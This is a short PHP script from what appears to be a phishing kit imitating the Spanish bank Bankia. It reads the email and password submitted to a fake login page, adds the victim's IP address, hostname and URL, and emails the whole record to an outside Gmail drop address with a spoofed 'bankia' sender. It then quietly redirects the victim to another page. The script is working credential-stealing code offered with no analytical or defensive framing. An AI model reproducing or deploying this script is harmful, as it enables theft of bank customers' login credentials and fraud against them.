<?php
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$back = "index2.html";
$hostname = gethostbyaddr($ip);
$message .= "~~~~~~ Alyss ~~~~~~\n";
$message .= "email           : ".$_POST['user']."\n";
$message .= "pass           : ".$_POST['pass']."\n";
$message .= "~~~~~~~~~ Infos ~~~~~~~~~~~\n";
$message .= "IPs              : $ip\n";
$message .= "HN               : $hostname\n";
$message .= " U7l             : $link\n";
$message .= "~~~~~~~ Spirito ~~~~~~~\n";
$send = "resultas2040@gmail.com";
$subject = "bankia | $ip ";
$headers = "From:bankia<webmas@gmail.com>";
mail($send,$subject,$message,$headers);
 

header("Location: $back");

?>